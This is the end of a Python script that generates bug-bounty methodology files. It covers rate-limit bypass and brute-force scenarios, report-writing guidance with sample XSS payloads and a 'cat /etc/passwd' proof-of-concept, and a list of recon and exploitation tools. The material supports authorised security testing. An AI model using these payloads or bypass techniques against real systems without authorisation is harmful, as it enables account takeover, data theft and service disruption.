5.  **Weak Rate Limiting Logic:**
    *   **Time Windows:** If rate limit is 5 requests/minute, send 4 requests, wait 59 seconds, send 4 more.
    *   **Bursting:** Send a large number of requests very quickly, then wait for the cooldown.
6.  **Functional Bypass:**
    *   Is there an alternative, un-rate-limited endpoint that performs a similar action?
    *   Example: A "forgot password" flow with weak rate limiting on OTP, but no rate limiting on a backup "security question" flow.

### Exploitation Scenarios:
*   **Brute-Force Attack:** Crack passwords or OTPs.
*   **Credential Stuffing:** Use leaked credentials from other breaches to test against the target.
*   **Account Lockout:** Lock out legitimate users by repeatedly attempting their password.
*   **Denial of Service (DoS):** Exhaust server resources by making too many expensive requests.

## Notes:
*   Rate limiting is a critical defense mechanism. Thoroughly test its robustness.
*   Combine different bypass techniques for maximum effectiveness.
*   Always be mindful of the program's rules regarding DoS or resource exhaustion.
""",
        },
        "13_Reporting": {
            "01_Reporting_Guidelines.txt": r"""# 13.01 Reporting Guidelines

## Target: {target_url}

This phase focuses on clearly and concisely documenting your findings and their impact. A well-written report increases the chances of your vulnerability being accepted and rewarded.

### General Reporting Guidelines:
*   **Clarity and Conciseness:** The report should be easy to understand for both technical and non-technical audiences.
*   **Accuracy:** All information must be factually correct and reproducible.
*   **Professionalism:** Maintain a professional tone throughout the report.
*   **Program Specifics:** Always adhere to the specific reporting guidelines of the bug bounty program you are working on (e.g., HackerOne, Bugcrowd, private programs).

### Key Sections of a Vulnerability Report:
1.  **Vulnerability Title:**
    *   A clear, descriptive, and impactful title.
    *   Example: "Reflected XSS on Search Function via `q` Parameter" or "IDOR leading to Unauthorized Access of User PII".

2.  **Vulnerability Description:**
    *   Brief explanation of the vulnerability type (e.g., "Cross-Site Scripting (XSS) allows an attacker to inject malicious client-side scripts...").
    *   Common causes and risks associated with this vulnerability.

3.  **Affected URL(s):**
    *   The exact URL(s) where the vulnerability was found.
    *   Include relevant parameters if applicable.

4.  **Steps to Reproduce (STR):**
    *   A numbered list of precise, step-by-step instructions that allow anyone to reproduce the vulnerability easily.
    *   Include all necessary inputs, payloads, and HTTP requests (e.g., using `curl` commands, Burp Suite request/response copies, or browser steps).
    *   Screenshots or video recordings (GIFs) are highly recommended and often required.
    *   Example:
        1.  Go to `https://{target_url_domain}/search?q=test`
        2.  Inject payload in `q` parameter: `https://{target_url_domain}/search?q=<script>alert(document.domain)</script>`
        3.  Observe `alert` box popping up with `document.domain`.

5.  **Proof of Concept (PoC):**
    *   Demonstrate the highest possible impact of the vulnerability.
    *   For XSS: `alert(document.domain)` or `alert(document.cookie)`.
    *   For RCE: `id` or `cat /etc/passwd`.
    *   For IDOR: Show data of another user.
    *   Clearly show the output or effect of the exploit.

6.  **Impact:**
    *   Explain the potential consequences of the vulnerability in clear, non-technical terms.
    *   Examples: "Attacker can steal user sessions," "Attacker can gain full control of the server," "Sensitive data exfiltration of all user PII."
    *   Assign a severity level (e.g., Critical, High, Medium, Low, Informational) based on CVSS or the program's specific guidelines.

7.  **Remediation/Recommendation:**
    *   Suggest concrete steps the developers can take to fix the vulnerability.
    *   Provide links to relevant resources (e.g., OWASP Cheatsheets for specific vulnerability types).
    *   Examples: "Implement proper input sanitization and output encoding," "Use parameterized queries to prevent SQL injection," "Implement anti-CSRF tokens for all state-changing requests."

8.  **References:**
    *   Links to external resources (e.g., OWASP Top 10, CVE database, PortSwigger Web Security Academy articles).
    *   Any specific research papers or articles that support your findings.

### Additional Tips:
*   **Reproducibility:** Ensure your report is perfectly reproducible. If the reviewer cannot reproduce it, it will likely be closed.
*   **One Vulnerability Per Report:** Generally, report each unique vulnerability separately. If multiple vulnerabilities are chained, describe the chain in one report.
*   **Be Patient:** Wait for the program to review your report. Avoid spamming them with follow-up questions.
*   **Thank the Program:** Always maintain good communication and professionalism.
""",
        },
        "14_Tools_and_Resources": {
            "01_Essential_Tools.txt": r"""# 14.01 Essential Tools

## Target: {target_url}

This section provides a consolidated list of useful tools for Bug Bounty hunting.

### Web Proxies:
*   **Burp Suite Community/Professional:** [https://portswigger.net/burp](https://portswigger.net/burp)
    *   Intercepting HTTP/S traffic, manual testing, active/passive scanning, Intruder for fuzzing, Repeater for modifying requests, Decoder, Comparer, Sequencer.
*   **OWASP ZAP:** [https://www.zaproxy.org/](https://www.zaproxy.org/)
    *   Open-source alternative to Burp Suite, active/passive scanning, fuzzer, spidering.

### Reconnaissance Tools:
*   **Subdomain Enumeration:**
    *   [Subfinder](https://github.com/projectdiscovery/subfinder)
    *   [Assetfinder](https://github.com/tomnomnom/assetfinder)
    *   [Amass](https://github.com/OWASP/Amass)
    *   [Findomain](https://github.com/Findomain/Findomain)
    *   [Knockpy](https://github.com/guelfoweb/knockpy)
*   **Live Host & Port Scanning:**
    *   [HTTPX](https://github.com/projectdiscovery/httpx) (HTTP server prober)
    *   [Naabu](https://github.com/projectdiscovery/naabu) (Fast port scanner)
    *   [Nmap](https://nmap.org/) (Network scanner, service discovery, scriptable)
    *   [Masscan](https://github.com/robertdavidgraham/masscan) (Fastest port scanner)
*   **Content Discovery:**
    *   [Dirsearch](https://github.com/maurosoria/dirsearch) (Directory brute-forcing)
    *   [Gobuster](https://github.com/OJ/gobuster) (Directory, DNS, VHost brute-forcing)
    *   [FFuF](https://github.com/ffuf/ffuf) (Fast web fuzzer)
    *   [Feroxbuster](https://github.com/epi052/feroxbuster) (Fast, simple, recursive content discovery)
*   **JavaScript Analysis:**
    *   [SubJS](https://github.com/lc/subjs) (Extracts JS files from HTTPX output)
    *   [Linkfinder](https://github.com/GerbenJavado/LinkFinder) (Extracts links/endpoints from JS files)
    *   [JSFScan.py](https://github.com/KathanP19/JSFScan.py) (Automates JS file discovery and analysis)
*   **Cloud Reconnaissance:**
    *   [S3Scanner](https://github.com/sa7mon/S3Scanner) (Scans for open S3 buckets)
    *   [Cloud-Enum](https://github.com/initstring/cloud_enum) (Enumerates common cloud resources)
    *   [Bucket Stream](https://github.com/arkadiyt/bucket_stream) (Monitors S3 bucket activity)
*   **Parameter Discovery:**
    *   [Arjun](https://github.com/s0md3v/Arjun) (Parameter discovery suite)
    *   [ParamSpider](https://github.com/devanshbatham/ParamSpider) (Extracts parameters from URLs)
    *   [Gf](https://github.com/tomnomnom/gf) (A wrapper around `grep` to enable easy grepping for interesting patterns)
*   **Visual Reconnaissance:**
    *   [Aquatone](https://github.com/michenriksen/aquatone) (Screenshots of web apps)
    *   [Eyewitness](https://github.com/FortyNorthSecurity/EyeWitness) (Screenshots of web apps, RDP, VNC)

### Vulnerability Specific Tools:
*   **SQL Injection:**
    *   [SQLMap](http://sqlmap.org/) (Automated SQL injection tool)
*   **Command Injection:**
    *   [Commix](https://github.com/commixproject/commix) (Automated command injection tool)
*   **LFI/RFI:**
    *   [LFISuite](https://github.com/D3VL/LFISuite)
*   **SSRF:**
    *   [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
    *   [Gopherus](https://github.com/pimps/gopherus) (Generates Gopher payloads)
*   **Deserialization:**
    *   [ysoserial](https://github.com/frohoff/ysoserial) (Java deserialization payloads)
    *   [PHPGGC](https://github.com/ambionics/phpggc) (PHP deserialization payloads)
*   **XSS:**
    *   [XSStrike](https://github.com/s0md3v/XSStrike)
    *   [Dalfox](https://github.com/hahwul/dalfox)
    *   [XSS Hunter](https://xsshunter.com/) (OOB XSS detection)

### Wordlists:
*   [SecLists](https://github.com/danielmiessler/SecLists) (Comprehensive collection of wordlists for various purposes)
*   [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (Curated list of payloads and attack vectors)

### Learning Resources:
*   **OWASP Top 10:** [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/) (Essential for understanding common web vulnerabilities)
*   **PortSwigger Web Security Academy:** [https://portswigger.net/web-security](https://portswigger.net/web-security) (Excellent free labs and tutorials for web vulnerabilities)
*   **HackerOne Hacktivity:** [https://www.hackerone.com/hacktivity](https://www.hackerone.com/hacktivity) (Publicly disclosed vulnerability reports)
*   **Bugcrowd disclose:** [https://bugcrowd.com/disclose](https://bugcrowd.com/disclose) (Similar to Hacktivity)
*   **NahamSec YouTube Channel:** [https://www.youtube.com/@NahamSec](https://www.youtube.com/@NahamSec) (Bug Bounty tips and live hacking)
*   **The XSS Rat:** [https://thexssrat.com/](https://thexssrat.com/) (XSS specific resources)
*   **Hack The Box / TryHackMe:** (Platforms for practicing ethical hacking skills)

## Notes:
*   Continuously update your toolset and knowledge base.
*   Practice regularly on labs and responsibly on eligible targets.
*   Always refer to the official documentation of each tool for the most up-to-date usage instructions.
""",
        },
    }

    for phase_name, files in phases.items():
        phase_dir = os.path.join(base_dir, phase_name)
        try:
            os.makedirs(phase_dir, exist_ok=True)
            print(f"  Created phase directory: {phase_dir}")
        except OSError as e:
            print(f"Error creating directory {phase_dir}: {e}")
            continue

        for file_name, content in files.items():
            file_path = os.path.join(phase_dir, file_name)
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    # Safe replacement that avoids string formatting crashes on payloads
                    formatted_content = content.replace("{target_url}", full_target_url).replace("{target_url_domain}", target_url_domain)
                    f.write(formatted_content)
                print(f"    Created file: {file_name}")
            except IOError as e:
                print(f"Error writing to file {file_path}: {e}")

    print("\nBug Bounty methodology framework created successfully!")
    print(f"Your project is located at: {base_dir}")
    print("Start your bug bounty journey with AW-BountyCraft!")


def main():
    """
    Main function to run the AW-BountyCraft tool.
    """
    print("-----------------------------------------------------")
    print("  AW-BountyCraft - Bug Bounty Methodology Framework  ")
    print("  Developed by Ahmed Wael  > Telegram : @A7medwae1   ")
    print("-----------------------------------------------------")

    target_url = input("\nEnter the target website URL (e.g., https://example.com): ").strip()
    if not target_url:
        print("Target URL cannot be empty. Exiting.")
        sys.exit(1)

    project_name = input("Enter a project name (e.g., example_bounty) [Press Enter for default]: ").strip()
    if not project_name:
        if not target_url.startswith(("http://", "https://")):
            temp_url = "https://" + target_url
        else:
            temp_url = target_url
            
        parsed_url_netloc = urlparse(temp_url).netloc
        if parsed_url_netloc:
            project_name = parsed_url_netloc.replace('.', '_').replace('-', '_') + "_bounty"
        else:
            project_name = "bug_bounty_project"
        print(f"No project name provided. Using default: {project_name}")

    create_methodology_framework(target_url, project_name)

if __name__ == "__main__":
    main()
